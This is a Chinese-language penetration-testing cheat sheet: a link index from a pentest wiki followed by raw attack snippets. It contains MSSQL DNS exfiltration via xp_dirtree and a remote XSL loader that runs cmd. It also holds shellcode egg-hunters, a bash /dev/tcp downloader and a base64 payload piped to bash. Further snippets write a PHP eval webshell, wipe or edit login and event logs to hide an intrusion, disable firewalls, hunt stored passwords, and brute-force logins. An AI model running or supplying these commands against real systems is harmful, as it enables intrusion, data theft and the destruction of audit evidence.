  - [Linux](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/权限维持/Linux/README.md)
    - [Linux cron后门](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/权限维持/Linux/Linux-cron后门.md)
    - [文件处理](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/权限维持/Linux/文件处理.md)
    - [IPTables端口复用](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/权限维持/Linux/IPTables端口复用.md)
    - [Kbeast_rootkit](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/权限维持/Linux/Kbeast_rootkit.md)
    - [OpenSSH后门](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/权限维持/Linux/OpenSSH后门.md)
    - [进程注入](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/权限维持/Linux/进程注入.md)
    - [Reptile](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/权限维持/Linux/Reptile.md)
    - [SSHD后门](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/权限维持/Linux/SSHD后门.md)
    - [SSH公私钥登录](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/权限维持/Linux/SSH公私钥登录.md)
    - [SSH wrapper后门](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/权限维持/Linux/SSH-wrapper后门.md)
    - [Strace记录ssh密码](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/权限维持/Linux/Strace记录ssh密码.md)
    - [SUID Shell](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/权限维持/Linux/SUID-Shell.md)
    - [apt后门](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/权限维持/Linux/apt后门.md)
    - [bash_rc](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/权限维持/Linux/bash_rc.md)
    - [后门驱动程序](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/权限维持/Linux/后门驱动程序.md)
    - [启动项服务后门](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/权限维持/Linux/启动项服务后门.md)
    - [用户启动文件](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/权限维持/Linux/用户启动文件.md)
  - [web服务&中间件](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/权限维持/web服务&中间件/README.md)
    - [Apache](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/权限维持/web服务&中间件/Apache.md)
    - [IIS](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/权限维持/web服务&中间件/IIS.md)
    - [Java](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/权限维持/web服务&中间件/Java.md)
    - [Nginx](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/权限维持/web服务&中间件/Nginx.md)

- [赏金技巧](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/赏金技巧/README.md)
  - [2FA双因子认证绕过](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/赏金技巧/2FA双因子认证绕过.md)
  - [403 bypass](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/赏金技巧/403-bypass.md)
  - [命令注入Bypass](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/赏金技巧/命令注入Bypass.md)
  - [配置错误的云存储桶](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/赏金技巧/配置错误的云存储桶.md)
  - [CMS](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/赏金技巧/CMS.md)
  - [字典](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/赏金技巧/字典/README.md)
    - [从站点生成字典](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/赏金技巧/字典/从站点生成字典.md)
    - [查找git和svn的字典](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/赏金技巧/字典/查找git和svn的字典.md)
    - [已泄露的密码整理出的字典](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/赏金技巧/字典/已泄露的密码整理出的字典.md)
    - [loT高频率账户密码](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/赏金技巧/字典/loT高频率账户密码.md)
    - [来自github的字典](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/赏金技巧/字典/来自github的字典.md)
  - [未认证的ElasticsearchDB](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/赏金技巧/未认证的ElasticsearchDB.md)
  - [favico信息](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/赏金技巧/favico信息.md)
  - [Github](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/赏金技巧/Github.md)
  - [git和svn](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/赏金技巧/git和svn.md)
  - [参数污染](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/赏金技巧/参数污染.md)
  - [通过.json的信息泄露](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/赏金技巧/通过.json的信息泄露.md)
  - [一行命令](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/赏金技巧/一行命令/README.md)
    - [使用grep快速去除垃圾数据](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/赏金技巧/一行命令/使用grep快速去除垃圾数据.md)
    - [查找漏洞](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/赏金技巧/一行命令/查找漏洞.md)
  - [子域名接管](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/赏金技巧/子域名接管.md)
  - [测试是否存在heartbleed漏洞](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/赏金技巧/测试是否存在heartbleed漏洞.md)
  - [sql注入检测](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/赏金技巧/sql注入检测.md)
  - [TOP系列](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/赏金技巧/TOP系列/README.md)
    - [Top25LFI参数](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/赏金技巧/TOP系列/Top25LFI参数.md)
    - [Top25RCE参数](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/赏金技巧/TOP系列/Top25RCE参数.md)
    - [Top25重定向dorks](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/赏金技巧/TOP系列/Top25重定向dorks.md)
    - [Top25ssrf](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/赏金技巧/TOP系列/Top25ssrf.md)
  - [绕过登录限制](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/赏金技巧/绕过登录限制.md)

- [云安全](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/云安全/README.md)
  - [AWS](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/云安全/AWS/README.md)
    - [初始访问](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/云安全/AWS/初始访问.md)
    - [权限提升](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/云安全/AWS/权限提升.md)
    - [权限维持](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/云安全/AWS/权限维持.md)
    - [枚举](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/云安全/AWS/枚举.md)
    - [AWS的服务](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/云安全/AWS/AWS的服务.md)
    - [工具](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/云安全/AWS/工具.md)
    - [将EBS卷挂载到EC2Linux](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/云安全/AWS/将EBS卷挂载到EC2Linux.md)
    - [使用AMI映像复制EC2](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/云安全/AWS/使用AMI映像复制EC2.md)
    - [通过API密钥获得AWS控制台访问权限](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/云安全/AWS/通过API密钥获得AWS控制台访问权限.md)
    - [Golden-SAML-Attack](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/云安全/AWS/Golden-SAML-Attack.md)
    - [Shadow-Copy-attack](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/云安全/AWS/Shadow-Copy-attack.md)
    - [Lambda-提取函数的代码](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/云安全/AWS/Lambda-提取函数的代码.md)
    - [InstanceConnect-将SSH密钥推送到EC2实例](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/云安全/AWS/InstanceConnect-将SSH密钥推送到EC2实例.md)
    - [SSM-命令执行](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/云安全/AWS/SSM-命令执行.md)
    - [动态数据库](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/云安全/AWS/动态数据库.md)
    - [禁用CloudTrail](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/云安全/AWS/禁用CloudTrail.md)
    - [通过混淆Cloudtrail日志和GuardDuty来掩盖踪迹](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/云安全/AWS/通过混淆Cloudtrail日志和GuardDuty来掩盖踪迹.md)
  - [Docker](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/云安全/Docker/README.md)
    - [未授权API](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/云安全/Docker/未授权API.md)
    - [逃逸](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/云安全/Docker/逃逸.md)
    - [权限维持](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/云安全/Docker/权限维持.md)
  - [GCP](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/云安全/GCP/README.md)
    - [初始访问](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/云安全/GCP/初始访问.md)
    - [权限维持](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/云安全/GCP/权限维持.md)
    - [枚举](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/云安全/GCP/枚举.md)
    - [特权升级和横向移动](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/云安全/GCP/特权升级和横向移动.md)
  - [kubernetes](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/云安全/kubernetes/README.md)
    - [未授权API](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/云安全/kubernetes/未授权API.md)
    - [权限提升](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/云安全/kubernetes/权限提升.md)
    - [权限维持](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/云安全/kubernetes/权限维持.md)
    - [枚举](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/云安全/kubernetes/枚举.md)
  - [Azure](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/云安全/Azure/README.md)
    - [侦察工具](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/云安全/Azure/侦察工具.md)
    - [枚举](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/云安全/Azure/枚举.md)
    - [非法同意](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/云安全/Azure/非法同意.md)
    - [钓鱼](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/云安全/Azure/钓鱼.md)
    - [令牌](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/云安全/Azure/令牌.md)
    - [向所有EnterpriseApplications添加凭据](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/云安全/Azure/向所有EnterpriseApplications添加凭据.md)
    - [为AzureWeb应用程序生成SSH](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/云安全/Azure/为AzureWeb应用程序生成SSH.md)
    - [Azure存储Blob](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/云安全/Azure/Azure存储Blob.md)
    - [自动化runbook](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/云安全/Azure/自动化runbook.md)
    - [虚拟机runCommand](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/云安全/Azure/虚拟机runCommand.md)
    - [KeyVault](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/云安全/Azure/KeyVault.md)
    - [Pass-The-PRT](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/云安全/Azure/Pass-The-PRT.md)
    - [Pass-The-Certificate](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/云安全/Azure/Pass-The-Certificate.md)
    - [Intunes管理](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/云安全/Azure/Intunes管理.md)
    - [动态组成员资格](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/云安全/Azure/动态组成员资格.md)
    - [Administrative-Unit](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/云安全/Azure/Administrative-Unit.md)
    - [部署模板](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/云安全/Azure/部署模板.md)
    - [应用程序代理](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/云安全/Azure/应用程序代理.md)
    - [条件访问](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/云安全/Azure/条件访问.md)
    - [AzureAD](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/云安全/Azure/AzureAD.md)
    - [AzureAD连接](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/云安全/Azure/AzureAD连接.md)
  - [Aliyun](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/云安全/Aliyun/README.md)
    - [osskey](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/云安全/Aliyun/osskey.md)
  - [工具](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/云安全/工具.md)


```

tips mssql反弹命令：  
```
BEGIN TRY
   exec sp_configure 'show advanced options',1
   reconfigure
END TRY
BEGIN CATCH
  declare @d varchar(8000)
  set @d = master.dbo.fn_varbintohexstr(convert(varbinary(max), substring(ERROR_MESSAGE(),1,10)))
  set @d='\\'+@d+'.19c.dnslog.cn\a'
  select @d
  exec xp_dirtree @d,1,1
  waitfor delay '00:00:03'
END CATCH




再给大家分享一个代码
declare @o int, @hr int, @str varchar(8000), @url varchar(2000)
set @url = 'http://1.1.75.0:443/2.xsl?' + convert(varchar, getdate(), 14) 
exec sp_oacreate 'msxml2.domdocument', @o out
exec sp_oasetproperty @o, 'async', false
exec sp_oamethod @o, 'load', @hr out, @url
exec sp_oamethod @o, 'transformNode', @str out, @o
exec sp_OADestroy @o
select @str

<xsl:stylesheet
xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
xmlns:user="http://mycompany.com/mynamespace"
xmlns:msxsl="urn:schemas-microsoft-com:xslt" version="1.0">
<xsl:output method="text" encoding="UTF-8" />
<xsl:template match="/">
	<xsl:value-of select="user:run()"/>
</xsl:template>
<msxsl:script language="javascript" implements-prefix="user">
function run () {
	try {
		var shell = new ActiveXObject('Wscript.Shell');
		return shell.exec('cmd /c ver').StdOut.ReadAll();	
	}
	catch(e) {
		return e.description;
	}
}
</msxsl:script>
</xsl:stylesheet>

sp_MSforeachtable和sp_MSforeachdb

```
tips：  
shellcode:
```
（1）、搜寻堆栈；
      push  esp
      pop   edi
      push  esp 
      pop   ecx
      mov eax,0x90909090  // 5 bytes   mov ax,0x9090   4 bytes
      repnz
      scasd               //1 bytes    scasw          2 bytes   4+2=5+1
          push edi
          ret
         简化的版本可能是6字节的shellcode：
      push  esp
      pop   edi
      repnz
      scasd
          push edi
          ret
 
    (2)、搜寻堆中shellcode。
          mov  eax,dword ptr [0x7ffdf018]
          add   ax,0x017c
          mov  edi,dword ptr [eax]
          push  eax
          pop   ecx        
          std 
          repnz
          scasw
          push edi
          ret
 
   如果堆的位置大致固定，可以简化：          
 
          mov   edi,0x11223344
          push   edi
          pop    eax
          repnz
          scasw
          push   edi
          ret
```

```

 echo ""> /var/log/wtmp 

 for i in {1..255}; do echo 219.76.111.$i; done


 while true
do
  sleep 89200
  reboot
done

wfuzz -f out.html -c -z file,/root/wordlist/abc.txt --hh 434  -p 127.0.0.1:1080:SOCKS5 -d "username=admin&password=FUZZ" -u http://192.168.1.130/login/index.php

ffuf -u "http://192.168.242.62/FUZZ"  -w top7000.txt   -fc "200"   -o 2.html -of html
ffuf -u "http://192.168.242.62/FUZZ"  -w test.txt  -x "http://127.0.0.1:8080"  -recursion "2"
ffuf -w dict.txt -w http://website.com/FUZZ -e .aspx,.html -mc 200,301
多域名扫描：
ffuf -w dict.txt:FUZZ  -w /targets.txt:URL -u URLFUZZ -mc 200 -of csv -o result.txt
子域名扫描：
ffuf -w subdomains.txt -u http://website.com/ -H "Host:FUZZ.website.com"

ffuf -w wordlist.txt -X POST -d "username=admin\&password=FUZZ" -u http://website.com/FUZZ
ffuf -request poc.txt -request-proto http -mode clusterbomb -w ./test.txt:HFUZZ -w test.txt:WFUZZ -x "http://127.0.0.1:8080"


```

```
#查找所有带user和pass的txt
find / -type f  -name "user*.txt" -or -name "pass*.txt" 2> /dev/null 
#查找所有文件中的账号密码
find / -type f|egrep -v "*.js"|egrep -v "*.css"|egrep -v "*.html"|egrep -v "*.htm"|egrep -v "*.woff"|egrep -v "*.jar"|egrep -v "*.java"|egrep -v "*.class"|egrep -v "*.properties"|egrep -v "*.MF"|egrep -v "*.tmp"|egrep -v "*.vm"|egrep -v "*.svn*"|egrep -v "*LICENSE*"|egrep -v "*.exe"|egrep -v "*.xml"|egrep -v "*.svg"|xargs egrep -s -i  "*user:|*user=|username:|username=|*pass:|*pass=|password:|password=|passwd:|passwd=|账号：|账号:|用户名：|用户名:|密码：|密码:" --color
#若需同时执行可以用 & 连接，即'命令1&命令2'
```
```
netsh advfirewall firewall show rule name=all
netsh advfirewall firewall add rule name="Open Port" dir=out action=allow protocol=TCP localport=80
netsh advfirewall firewall add rule name="Open Port" dir=in action=allow protocol=TCP localport=80

netsh advfirewall firewall add rule name="Open Port" dir=out action=allow protocol=UDP localport=53

netsh advfirewall firewall add rule name="Open Port" dir=in action=allow protocol=UDP localport=53

netsh firewall set opmode disable 关闭防火墙
netsh firewall set opmode enable 开启防火墙

```

```
unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG; export HISTFILE=/dev/null; export HISTSIZE=0; export HISTFILESIZE=0

    /var/log/btmp   记录所有登录失败信息，使用lastb命令查看
    /var/log/lastlog 记录系统中所有用户最后一次登录时间的日志，使用lastlog命令查看
    /var/log/wtmp    记录所有用户的登录、注销信息，使用last命令查看
    /var/log/utmp    记录当前已经登录的用户信息，使用w,who,users等命令查看
    /var/log/secure   记录与安全相关的日志信息
    /var/log/message  记录系统启动后的信息和错误日志
centos 
utmpdump /var/log/wtmp |sed "s/8.8.8.8/1.1.1.1/g" |utmpdump -r >/tmp/wtmp1 &&\mv  /tmp/wtmp1 /var/log/wtmp

ssh -T root@192.168.0.1 /bin/bash -i

sed  -i '/攻击ip/d'  /var/log/secure    # 删除登录日志攻击ip所在的行
sed -i 's/192.168.1.1/127.0.0.1/g' /var/log/access.log  # 全局替换访问IP地址
cat /var/log/nginx/access.log | grep -v shell.php > tmp.log  # 删除入侵相关信息
cat tmp.log > /var/log/nginx/access.log/  # 把修改过的日志覆盖到原日志文件


 echo > /var/log/wtmp //清除用户登录记录
 echo > /var/log/btmp //清除尝试登录记录
 echo > /var/log/lastlog //清除最近登录信息
 echo > /var/log/secure //登录信息
 echo > /var/log/messages
 echo > /var/log/syslog //记录系统日志的服务
 echo > /var/log/xferlog
 echo > /var/log/auth.log
 echo > /var/log/user.log
 cat /dev/null > /var/adm/sylog
 cat /dev/null > /var/log/maillog
 cat /dev/null > /var/log/openwebmail.log
 cat /dev/null > /var/log/mail.info
 echo > /var/run/utmp
echo > /root/.bash_history
history -cw 


```

```
  
wevtutil cl system
wevtutil cl application
wevtutil cl security

reg query HKLM\SOFTWARE\Classes\.tudf /s

attrib +h +s +r "Server.dat"
```
```
function DOWNLOAD() {
  url=$1
  proto="http://"
  host=${url/$proto/}
  server=${host%%/*}
  path=${host#*/}
  DOC=/${path// /}
  HOST=${server/:*/}
  PORT=${server/*:/}
  [[ -n ${PORT} ]] || PORT=80
  PORT=$(( PORT + 0 ))
  exec 3<>/dev/tcp/${HOST}/${PORT}
  echo -en "GET ${DOC} HTTP/1.0\r\nHost: ${HOST}\r\n\r\n" >&3
  while IFS= read -r line ; do
    [[ "${line}" == $'\r' ]] && break
  done <&3
  nul='\0'
  while IFS= read -d '' -r x || { nul=""; [ -n "$x" ]; }; do
    printf "%s${nul}" "${x}"
  done <&3
  exec 3>&-
}
DOWNLOAD http://g.com:80/scan >scan
```

```
#! /bin/bash
if [ "$1" == "" ]
then
	echo "Usage: ./ping.sh [network]"
       	echo "Example: ./ping.sh 192.168.197"
else
	for ip in $(seq 1 254);do
		ping -c 1 $1.$ip | grep "64 bytes" | cut -d " " -f 4 | sed 's/.$//' &
	done
	fi
```
```
#!/bin/bash
HOST=$1
PORT="21 22 53 80 81 82 83 84 85 86 87 88 89 161 389 3690 7788 5985 512 513 514 873 1521 1025 2222 2601 2604 3128 3389 5632 5900 10000 28017 50000 50070 50030 135 139 443 445 1433 3306 5432 6379 7001 8000 8080 8089 9000 9200 11211 27017"
for PORT in $PORT; do
    if echo &>/dev/null > /dev/tcp/$HOST/$PORT; then
        echo "$PORT open"
   #else
        #echo "$PORT close"
    fi
done


```
```
#!/bin/bash
PORT="21 22"
for i in {1..255}; do
    HOST="192.168.1.$i"

    for PORT in $PORT; do
        if echo &>/dev/null > /dev/tcp/$HOST/$PORT; then
            echo "$HOST:$PORT open"
        #else
            #echo "$HOST:$PORT close"
        fi
    done
done

```


手动编码操作  
```
bash -c {echo,cGluZyAxMjcuMC4wLjE7ZWNobyAxID50ZXN0LnR4dA==}|{base64,-d}|{bash,-i}
```

## 命令执行，定位资源文件写文件回显
Linux
```
find /|grep index.js|while read f;do sh -c "whoami" >$(dirname $f)/test.txt;done
```
Windows(注意盘符)
```
for /r D:\ %i in (index.js*) do whoami > %i/../test.txt

```


## 写shell
在windows中，批处理需要转义字符主要有 “&”，“|”，“<”，“>”等等，转义字符为”^”  
在Linux中，需要转义字符主要是 单引号 或者双引号 对于单引号，我们将其替换为\47即可。  
windows命令行最大长度为8191,16进制长度是113898。echo写文件时注意长度。  

方法1
```
set /p=qaxnb<nul>d:\1d13.txt
```
方法2
```
echo qaxnb>1we.txt
```
追加内容
```
echo qaxnb>>1we.txt
```
不换行追加
```
set /p="121d2">>a.txt
```
规避空格
```
echo.123>>a.txt
echo,123>>a.txt
type;a.txt
```
写特殊字符很多的文件，可以用certutil编码再还原。
如下还原
```
certutil -f -decode 111.txt C:\\111.jsp
certutil -decodehex 111.txt C:\\111.jsp
```
linux下base64
```
echo PD9waHAgZXZhbCgkX1BPU1Rbd2hvYW1pXSk7Pz4=|base64 -d > /var/www/html/shell.php
```
php的
```
echo \<\?php eval\(\@\$_POST\[1\]\)\; \?\> >1.php
```
绕过空格
```
> < <> 重定向符
%09(需要php环境)
${IFS}
$IFS$9
{cat,flag.php}
%20
%09
```

# windows打包目录

```
powershell -Command "Compress-Archive -Path E:\update\ -DestinationPath E:\test.zip"

压缩单文件，压缩成zip、rar、cab看你个人喜欢
makecab 1.doc 1.zip
解压命令
expand 1.zip 1.doc
压缩加密
makecab /d compressiontype=lzx /d compressionmemory=21 file.kmv 1.cab
分包10M一个文件：
makecab /d compressiontype=lzx /d compressionmemory=21 /d maxdisksize=1024000 file.kmv 1.cab
压缩一个文件夹下的多个文件
dir /b >>name.txt
makecab /f name.txt
解压命令
expand 1.cab -f:* c:\test\

压缩特定文件或目录：
compact /c path_to_file_or_directory
压缩目录及其所有子目录：
compact /c /s:path_to_directory
解压缩
compact /u path_to_file_or_directory


```
### windows 开源防火墙好用
```
simplewall
```
#windows 登录记录密码
```
https://github.com/gtworek/PSBits/tree/master/PasswordStealing/NPPSpy
```
### google翻译ip查找 
```
git clone https://github.com/zfx1031/google-translate-ip.git
cd google-translate-ip
go build main.go
mv ip.txt ip.txt.bak
wget https://mirror.ghproxy.com/https://raw.githubusercontent.com/Ponderfly/GoogleTranslateIpCheck/master/src/GoogleTranslateIpCheck/GoogleTranslateIpCheck/ip.txt


https://github.com/Ponderfly/GoogleTranslateIpCheck.git

{
  "远程IP文件": "https://mirror.ghproxy.com/https://raw.githubusercontent.com/Ponderfly/GoogleTranslateIpCheck/master/src/GoogleTranslateIpCheck/GoogleTranslateIpCheck/ip.txt",
  "远程IPv6文件": "https://mirror.ghproxy.com/https://raw.githubusercontent.com/Ponderfly/GoogleTranslateIpCheck/master/src/GoogleTranslateIpCheck/GoogleTranslateIpCheck/IPv6.txt",
  "IP扫描限制数量": 5,
  "扫描超时": 4,
  "扫描并发数": 80,
  "Hosts": [
    "translate.googleapis.com",
    "translate.google.com",
    "translate-pa.googleapis.com"
  ],
  "IP段": [
    "142.250.0.0/15",
    "172.217.0.0/16",
    "172.253.0.0/16",
    "108.177.0.0/17",
    "72.14.192.0/18",
    "74.125.0.0/16",
    "216.58.192.0/19"
  ],
  "IPv6段": [
    "2404:6800:4008:c15::0/112",
    "2a00:1450:4001:802::0/112",
    "2a00:1450:4001:803::0/112"
  ]
}


```

# 匿名文件存储
可用命令行   
https://transfer.sh/
使用很简单   
```
上传，成功后返回随机路径
curl --upload-file ./hello.txt https://transfer.sh/hello.txt

获取
https://transfer.sh/fF6OA7aF8o/hello.txt


```

#xss dogxss搭建
```
git clone https://github.com/TryGOTry/dogxss.git
cd dogxss
Windows:
go build -o dogxss.exe -ldflags "-w -s" --trimpath main.go
Linux(由于sqlite库的问题,需在linux主机上编译):
go build -o dogxss -ldflags "-w -s" --trimpath main.go
ps:编译完成后请在当前目录下建立exp目录
dogxss -d www.baidu.com -key ssl.key -pem ssl.pem

指定域名和证书即可,默认绑定的是80和445端口,可按照自己的需求进行二开.
exp的地址默认前缀是x,如生成的项目名是a,那么exp地址就是www.baidu.com/x/a
可以自己在config/config.go中修改前缀.

需要测试的话，直接下载windows的版本.
然后执行dogxss.exe -d 127.0.0.1运行即可。
如果不使用ssl的话,那么https的站点就无法执行js.
登录页面:https://yourdomain/admin/fucklogin
默认账号:admin 默认密码:123456
```




## nmap

```
nmap -sn 10.11.1.0/24
```

```
nmap -sV -p- 10.11.1.0
```

```
nmap 10.11.1.0 --script vuln
```

```
nmap -p445 10.11.1.0 --script smb-vuln-ms17-010
```

```
nmap -v -sn -PE -n --min-hostgroup 1024 --min-parallelism 1024 -oG tmp -iL ip.txt | awk '{print $5}' | grep -v "latency)." >ok_ip.txt
```

nmap 极速扫描，快如闪电
```
nmap -n --unique --resolve-all -Pn --min-hostgroup 64 --max-retries 0 --host-timeout 10m --script-timeout 3m -oX {filename} --version-intensity 9 --min-rate 10000 -T4 192.168.23.1
nmap -n --resolve-all -Pn --min-hostgroup 64 --max-retries 0 --host-timeout 10m --script-timeout 3m -oX {filename} --version-intensity 9 --min-rate 10000 -T4 192.168.23.1
```

获取http title
```
nmap -n --resolve-all -Pn --min-hostgroup  --max-retries 3 --host-timeout 10m --script-timeout 3m --version-intensity 9 --min-rate 10000 --script=http-title -T4 -p- -iL domain.txt
```

## masscan 
注意速率问题,根据带宽调整。100m带宽可调3000,注意是vps，不是家庭宽带。   

关于编译，直接git拉下来，make就行。生成的文件在bin下面。   
扫描单ip   
```
masscan 192.168.1.110 -p 1-65535 --rate=1000
```
扫描列表
```
masscan -iL ip.txt -p1-65535 --rate=1000 -oL port.txt
```

解析,提取ip:port
```
cat port.txt |awk '{print $4":"$3}'
```
转换为nmap可用端口
```
cat p.txt | tr "\n" ,
```




## 端口列表

```
22,23,135,445,389,3389,80,443,8080,7001,3306,1433,1521,6379,27017,2375,5900,5432,4899

21-23,80-90,135,137,161,389,443,445,873,1099,1433,1521,1900,2082,2083,2222,2375,2376,2601,2604,3128,3306,3311,3312,3389,4440,4848,5001,5432,5560,5900-5902,6082,6379,7001-7010,7778,8009,8080-8090,8649,8888,9000,9200,10000,11211,27017,28017,50000,51111,50030,50060

20-26,30,32-33,37,42-43,49,53,70,79-85,88-90,99-100,106,109-111,113,119,125,135,139,143-144,146,161,163,179,199,211-212,222,254-256,259,264,280,301,306,311,340,366,389,406-407,416-417,425,427,443-445,458,464-465,481,497,500,512-515,524,541,543-545,548,554-555,563,587,593,616-617,625,631,636,646,648,666-668,683,687,691,700,705,711,714,720,722,726,749,765,777,783,787,800-801,808,843,873,880,888,898,900-903,911-912,981,987,990,992-993,995,999-1002,1007,1009-1011,1021-1100,1102,1104-1108,1110-1114,1117,1119,1121-1124,1126,1130-1132,1137-1138,1141,1145,1147-1149,1151-1152,1154,1163-1166,1169,1174-1175,1183,1185-1187,1192,1198-1199,1201,1213,1216-1218,1233-1234,1236,1244,1247-1248,1259,1271-1272,1277,1287,1296,1300-1301,1309-1311,1322,1328,1334,1352,1417,1433-1434,1443,1455,1461,1494,1500-1501,1503,1521,1524,1533,1556,1580,1583,1594,1600,1641,1658,1666,1687-1688,1700,1717-1721,1723,1755,1761,1782-1783,1801,1805,1812,1839-1840,1862-1864,1875,1900,1914,1935,1947,1971-1972,1974,1984,1998-2010,2013,2020-2022,2030,2033-2035,2038,2040-2043,2045-2049,2065,2068,2099-2100,2103,2105-2107,2111,2119,2121,2126,2135,2144,2160-2161,2170,2179,2190-2191,2196,2200,2222,2251,2260,2288,2301,2323,2366,2381-2383,2393-2394,2399,2401,2492,2500,2522,2525,2557,2601-2602,2604-2605,2607-2608,2638,2701-2702,2710,2717-2718,2725,2800,2809,2811,2869,2875,2909-2910,2920,2967-2968,2998,3000-3001,3003,3005-3007,3011,3013,3017,3030-3031,3052,3071,3077,3128,3168,3211,3221,3260-3261,3268-3269,3283,3300-3301,3306,3322-3325,3333,3351,3367,3369-3372,3389